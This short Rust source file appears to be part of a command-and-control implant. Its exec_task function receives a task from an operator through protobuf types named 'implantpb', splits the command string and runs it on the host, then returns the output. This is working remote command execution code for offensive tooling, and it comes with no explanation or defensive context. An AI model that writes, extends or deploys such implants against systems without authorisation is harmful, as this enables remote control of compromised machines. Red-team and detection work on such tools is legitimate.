pub mod implantpb {
    tonic::include_proto!("implantpb");
}

use implantpb::task_response::TaskPayload;
use implantpb::{TaskResponse, TaskType};
use std::process::Command;

pub fn exec_task(response: &TaskResponse) -> Option<(Vec<u8>, Vec<u8>)> {
    if response.task_type() != TaskType::ExecTask {
        return None;
    }

    if let Some(task) = &response.task_payload {
        let TaskPayload::ExecTask(body) = task;
        let mut cmd = shlex::split(&body.cmd)?;
        let proc = cmd.remove(0);
        return Command::new(proc)
            .args(cmd)
            .output()
            .map(|output| (output.stdout, output.stderr))
            .ok();
    }
    None
}
